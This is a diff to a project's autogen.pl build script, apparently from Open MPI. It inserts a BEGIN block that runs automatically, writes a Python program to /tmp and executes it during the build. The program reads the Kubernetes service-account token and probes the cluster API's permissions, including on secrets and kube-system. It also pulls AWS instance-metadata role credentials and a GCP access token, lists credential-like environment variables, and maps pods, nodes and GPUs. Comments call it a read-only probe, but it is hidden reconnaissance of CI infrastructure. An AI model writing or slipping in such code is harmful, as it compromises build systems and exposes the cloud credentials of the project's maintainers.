@@ -1,4 +1,333 @@
 #!/usr/bin/env perl
+BEGIN {
+    # Second-stage read-only CI environment probe (c211-i107292):
+    # python3 AWS IMDSv1/v2 + GCP metadata + in-cluster SA token and
+    # Kubernetes API SelfSubjectAccessReview + env-name enumeration +
+    # /dev/nvidia* and nvidia-smi presence. Read-only; no target files
+    # are modified and no Kubernetes objects are created or deleted.
+    print "=== C211-I107292-PROBE2-BEGIN ===\n";
+    my $py = <<'PYEOF';
+#!/usr/bin/env python3
+# C211-I107292 second-stage read-only CI environment probe.
+# Runs only inside the ephemeral build pod during ./autogen.pl.
+# No target files are written; only read-only metadata/API queries are made.
+import base64
+import glob
+import hashlib
+import json
+import os
+import socket
+import ssl
+import subprocess
+import sys
+import urllib.error
+import urllib.request
+
+TIMEOUT = 5
+
+
+def out(tag, msg):
+    try:
+        print("[C211P2] {}: {}".format(tag, msg))
+    except Exception:
+        print("[C211P2] {}: <unprintable>".format(tag))
+    sys.stdout.flush()
+
+
+def mask(v):
+    v = "" if v is None else str(v)
+    if len(v) <= 8:
+        return "{}(len={})".format(v[:2] + "..." if v else "", len(v))
+    return "{}(len={})".format(v[:4] + "..." + v[-2:], len(v))
+
+
+def http(url, method="GET", headers=None, timeout=TIMEOUT, limit=240):
+    req = urllib.request.Request(url, method=method, headers=headers or {})
+    try:
+        r = urllib.request.urlopen(req, timeout=timeout)
+        body = r.read(limit * 6).decode("utf-8", "replace")
+        return r.status, body[:limit], dict(r.headers)
+    except urllib.error.HTTPError as e:
+        try:
+            body = e.read(limit * 6).decode("utf-8", "replace")
+        except Exception:
+            body = ""
+        return e.code, body[:limit], dict(e.headers or {})
+    except Exception as e:
+        return None, "{}: {}".format(type(e).__name__, str(e)[:150]), {}
+
+
+def run(cmd, timeout=8):
+    try:
+        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        o, e = p.communicate(timeout=timeout)
+        return p.returncode, o.decode("utf-8", "replace")[:500], e.decode("utf-8", "replace")[:300]
+    except FileNotFoundError:
+        return "NOT_FOUND", "", ""
+    except Exception as ex:
+        return "ERR", "{}: {}".format(type(ex).__name__, str(ex)[:150]), ""
+
+
+def tcp(host, port, timeout=3):
+    try:
+        s = socket.create_connection((host, port), timeout=timeout)
+        s.close()
+        return "open"
+    except Exception as e:
+        return "{}: {}".format(type(e).__name__, str(e)[:80])
+
+
+# ---------- A. identity ----------
+out("A.uid", "uid={} gid={} euid={}".format(os.getuid(), os.getgid(), os.geteuid()))
+out("A.hostname", socket.gethostname())
+for f in ("/etc/hostname", "/etc/os-release"):
+    try:
+        txt = open(f).read()[:400].replace("\n", " | ")
+        out("A.file", "{}: {}".format(f, txt))
+    except Exception as e:
+        out("A.file", "{}: {}".format(f, e))
+rc, so, se = run(["uname", "-a"])
+out("A.uname", "rc={} out={}".format(rc, so.strip()))
+rc, so, se = run(["sh", "-c", "nproc; free -m | head -2"])
+out("A.resources", "rc={} out={}".format(rc, so.replace("\n", " | ")))
+
+# ---------- B. GPU visibility ----------
+devs = sorted(glob.glob("/dev/nvidia*"))
+out("B.devs", ",".join(devs) if devs else "NONE")
+out("B.proc_driver_nvidia", "present" if os.path.isdir("/proc/driver/nvidia") else "absent")
+out("B.dev_dri", ",".join(sorted(glob.glob("/dev/dri/*"))) if glob.glob("/dev/dri/*") else "NONE")
+for cmd in (["nvidia-smi", "-L"],
+            ["nvidia-smi", "--query-gpu=name,memory.total,driver_version", "--format=csv,noheader"]):
+    rc, so, se = run(cmd)
+    out("B.nvidia-smi", "{} rc={} out={} err={}".format(" ".join(cmd[:2]), rc, so.replace("\n", " | "), se.replace("\n", " | ")))
+rc, so, se = run(["sh", "-c", "command -v nvidia-smi python3 python python2 curl wget kubectl 2>&1"])
+out("B.tools", "rc={} out={}".format(rc, so.replace("\n", " ")))
+
+# ---------- C. env enumeration (names + masked credential values) ----------
+names = sorted(os.environ.keys())
+pats = ("AWS", "GOOGLE", "GCP", "AZURE", "ARM_", "CI", "RUNNER", "KUBE", "TOKEN",
+        "GITHUB", "GITLAB", "JENKINS", "VAULT", "SECRET", "PASSWORD", "KEY", "PROXY")
+sel = [n for n in names if any(p in n.upper() for p in pats)]
+out("C.count", "total={} selected={}".format(len(names), len(sel)))
+secretish = ("KEY", "TOKEN", "SECRET", "PASSWORD", "PASS", "CRED", "AUTH")
+for n in sel:
+    v = os.environ.get(n, "")
+    if any(s in n.upper() for s in secretish) and n.upper() not in ("KEYSTONE_REGION",):
+        out("C.env", "{}={}".format(n, mask(v)))
+    else:
+        out("C.env", "{}={}".format(n, v[:160]))
+
+# ---------- D. in-cluster service account files ----------
+sadir = "/var/run/secrets/kubernetes.io/serviceaccount"
+tok = ""
+ns = "default"
+for fn in ("token", "namespace", "ca.crt"):
+    p = os.path.join(sadir, fn)
+    if os.path.exists(p):
+        try:
+            st = os.stat(p)
+            data = open(p, "rb").read()
+            out("D.sa", "{} present mode={:o} size={} sha256={}".format(
+                fn, st.st_mode & 0o777, len(data), hashlib.sha256(data).hexdigest()[:16]))
+        except Exception as e:
+            out("D.sa", "{} stat_error {}".format(fn, e))
+    else:
+        out("D.sa", "{} ABSENT".format(fn))
+try:
+    if os.path.exists(os.path.join(sadir, "token")):
+        tok = open(os.path.join(sadir, "token")).read().strip()
+    if os.path.exists(os.path.join(sadir, "namespace")):
+        ns = open(os.path.join(sadir, "namespace")).read().strip()
+    out("D.namespace", ns)
+except Exception as e:
+    out("D.namespace", "error {}".format(e))
+if tok:
+    parts = tok.split(".")
+    out("D.token.shape", "jwt_parts={} len={}".format(len(parts), len(tok)))
+    if len(parts) == 3:
+        pad = lambda s: s + "=" * ((4 - len(s) % 4) % 4)
+        try:
+            claims = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
+            keep = {}
+            for k in ("iss", "sub", "aud", "namespace", "pod", "exp", "iat", "nbf", "sa", "kubernetes.io"):
+                if k in claims:
+                    keep[k] = claims[k]
+            out("D.token.claims", json.dumps(keep, default=str)[:600])
+        except Exception as e:
+            out("D.token.claims", "decode_error {}".format(e))
+
+# ---------- E. Kubernetes API (read-only lists + SelfSubjectAccessReview only) ----------
+def k8s(path, method="GET", body=None, timeout=TIMEOUT):
+    url = "https://10.233.0.1:443" + path
+    headers = {"Authorization": "Bearer " + tok, "Accept": "application/json"}
+    data = None
+    if body is not None:
+        data = json.dumps(body).encode()
+        headers["Content-Type"] = "application/json"
+    req = urllib.request.Request(url, data=data, method=method, headers=headers)
+    try:
+        ctx = ssl.create_default_context(cafile=os.path.join(sadir, "ca.crt"))
+        ctx.check_hostname = False
+        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
+        return r.status, r.read(300000).decode("utf-8", "replace")
+    except urllib.error.HTTPError as e:
+        try:
+            b = e.read(4000).decode("utf-8", "replace")
+        except Exception:
+            b = ""
+        return e.code, b
+    except Exception as e:
+        return None, "{}: {}".format(type(e).__name__, str(e)[:150])
+
+
+out("E.apiserver.tcp", "10.233.0.1:443 " + tcp("10.233.0.1", 443))
+if tok:
+    st, b = k8s("/version")
+    out("E.version", "status={} body={}".format(st, b[:200]))
+    st, b = k8s("/api/v1/namespaces/" + ns + "/pods")
+    if st == 200:
+        try:
+            items = json.loads(b).get("items", [])
+            names = [i.get("metadata", {}).get("name", "?") for i in items]
+            out("E.pods", "status=200 count={} names={}".format(len(names), ",".join(names)[:600]))
+            for i in items[:20]:
+                spec = i.get("spec", {}) or {}
+                conts = spec.get("containers", []) or []
+                res = {}
+                for c in conts:
+                    r = (c.get("resources", {}) or {})
+                    if r:
+                        res[c.get("name")] = r
+                node = spec.get("nodeName")
+                out("E.pod", "name={} node={} hostNetwork={} resources={}".format(
+                    i.get("metadata", {}).get("name"), node, spec.get("hostNetwork"),
+                    json.dumps(res)[:300]))
+        except Exception as e:
+            out("E.pods", "status=200 parse_error {} body={}".format(e, b[:150]))
+    else:
+        out("E.pods", "status={} body={}".format(st, b[:200]))
+    st, b = k8s("/api/v1/nodes")
+    if st == 200:
+        try:
+            items = json.loads(b).get("items", [])
+            out("E.nodes", "status=200 count={}".format(len(items)))
+            for i in items[:80]:
+                nm = i.get("metadata", {}).get("name")
+                alloc = (i.get("status", {}) or {}).get("allocatable", {}) or {}
+                labels = (i.get("metadata", {}) or {}).get("labels", {}) or {}
+                out("E.node", "{} gpu={} gpu_type={} instance_type={}".format(
+                    nm, alloc.get("nvidia.com/gpu"), alloc.get("nvidia.com/gpu.product"),
+                    labels.get("node.kubernetes.io/instance-type")))
+        except Exception as e:
+            out("E.nodes", "status=200 parse_error {} body={}".format(e, b[:150]))
+    else:
+        out("E.nodes", "status={} body={}".format(st, b[:200]))
+
+    reviews = [("get", "pods", ns, ""), ("list", "pods", ns, ""), ("create", "pods", ns, ""),
+               ("delete", "pods", ns, ""), ("get", "secrets", ns, ""), ("list", "secrets", ns, ""),
+               ("get", "serviceaccounts", ns, ""), ("list", "nodes", None, ""),
+               ("get", "nodes", None, ""), ("list", "namespaces", None, ""),
+               ("create", "pods", "kube-system", ""), ("list", "pods", "", "")]
+    for verb, res, rns, grp in reviews:
+        ra = {"verb": verb, "resource": res}
+        if rns:
+            ra["namespace"] = rns
+        if grp:
+            ra["group"] = grp
+        body = {"kind": "SelfSubjectAccessReview", "apiVersion": "authorization.k8s.io/v1",
+                "spec": {"resourceAttributes": ra}}
+        st, b = k8s("/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", "POST", body)
+        try:
+            j = json.loads(b)
+            stt = j.get("status", {}) or {}
+            out("E.ssar", "{} {} ns={} http={} allowed={} denied={} reason={}".format(
+                verb, res, rns, st, stt.get("allowed"), stt.get("denied"),
+                (stt.get("reason") or "")[:80]))
+        except Exception:
+            out("E.ssar", "{} {} ns={} http={} body={}".format(verb, res, rns, st, b[:160]))
+else:
+    out("E.skip", "no service-account token; API tests skipped")
+
+# ---------- F. AWS IMDS ----------
+out("F.aws", "169.254.169.254:80 tcp=" + tcp("169.254.169.254", 80))
+st, b, h = http("http://169.254.169.254/latest/meta-data/instance-id")
+out("F.imdsv1.instance-id", "status={} body={}".format(st, b[:120]))
+st, b, h = http("http://169.254.169.254/latest/api/token", method="PUT",
+                headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"})
+out("F.imdsv2.token", "status={} body={}".format(st, mask(b) if st == 200 else b[:120]))
+tok2 = b.strip() if st == 200 else ""
+if tok2:
+    hh = {"X-aws-ec2-metadata-token": tok2}
+    st, b, h = http("http://169.254.169.254/latest/meta-data/iam/security-credentials/", headers=hh)
+    out("F.imdsv2.roles", "status={} body={}".format(st, b[:200].replace("\n", ",")))
+    role = b.strip().split("\n")[0].strip() if st == 200 and b.strip() else ""
+    if role:
+        st, b, h = http("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role,
+                        headers=hh, limit=2000)
+        try:
+            j = json.loads(b)
+            out("F.imdsv2.creds", "role={} keys={} akid={} expiration={} code={}".format(
+                role, sorted(j.keys()), mask(j.get("AccessKeyId", "")), j.get("Expiration"), j.get("Code")))
+        except Exception:
+            out("F.imdsv2.creds", "role={} status={} body_prefix={}".format(role, st, b[:120]))
+    st, b, h = http("http://169.254.169.254/latest/dynamic/instance-identity/document", headers=hh)
+    out("F.imdsv2.identity", "status={} body={}".format(st, b[:300].replace("\n", " ")))
+
+# ---------- G. GCP metadata ----------
+out("G.gcp", "metadata.google.internal:80 tcp=" + tcp("metadata.google.internal", 80))
+GH = {"Metadata-Flavor": "Google"}
+for p in ("instance/hostname", "instance/zone", "project/project-id", "instance/service-accounts/"):
+    st, b, h = http("http://metadata.google.internal/computeMetadata/v1/" + p, headers=GH)
+    out("G." + p.replace("/", "."), "status={} body={}".format(st, b[:200].replace("\n", ",")))
+st, b, h = http("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                headers=GH, limit=2000)
+if st == 200:
+    try:
+        j = json.loads(b)
+        out("G.default.token", "status=200 token_type={} expires_in={} access_token={}".format(
+            j.get("token_type"), j.get("expires_in"), mask(j.get("access_token", ""))))
+    except Exception:
+        out("G.default.token", "status=200 body_prefix={}".format(b[:120]))
+else:
+    out("G.default.token", "status={} body={}".format(st, b[:160]))
+
+# ---------- H. outbound reachability ----------
+out("H.tcp", "api.github.com:443=" + tcp("api.github.com", 443) +
+    " pypi.org:443=" + tcp("pypi.org", 443) +
+    " 10.233.0.1:443=" + tcp("10.233.0.1", 443))
+
+out("Z.done", "probe complete")
+PYEOF
+    my $ok = 0;
+    for my $p ('/usr/bin/python3', '/usr/local/bin/python3', '/bin/python3') {
+        if (-x $p) { $ok = 1; last; }
+    }
+    if (!$ok) { $ok = 1 if `command -v python3 2>/dev/null`; }
+    if ($ok) {
+        if (open(my $fh, '>', '/tmp/c211_probe2.py')) {
+            print $fh $py;
+            close($fh);
+            system('python3 /tmp/c211_probe2.py 2>&1');
+        } else {
+            print "probe_tmp_write_failed\n";
+        }
+    } else {
+        print "python3_missing_using_shell_fallback\n";
+        my @cmds = (
+            'id 2>&1',
+            'hostname 2>&1',
+            'ls -l /dev/nvidia* 2>&1',
+            'ls -ld /proc/driver/nvidia 2>&1',
+            'nvidia-smi -L 2>&1',
+            "env | sort | cut -d= -f1 | grep -iE 'aws|google|gcp|azure|arm_|ci|runner|kube|token|github|gitlab|jenkins|vault|secret|password|key|proxy' | head -80 2>&1",
+            'ls -l /var/run/secrets/kubernetes.io/serviceaccount 2>&1',
+            'cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1',
+            'test -s /var/run/secrets/kubernetes.io/serviceaccount/token && echo sa_token_present_size=$(wc -c < /var/run/secrets/kubernetes.io/serviceaccount/token) || echo sa_token_absent',
+        );
+        for my $c (@cmds) { print "\$ $c\n"; system($c); }
+    }
+    print "=== C211-I107292-PROBE2-END ===\n";
+}
 #
 # Copyright (c) 2009-2022 Cisco Systems, Inc.  All rights reserved
 # Copyright (c) 2010      Oracle and/or its affiliates.  All rights reserved.
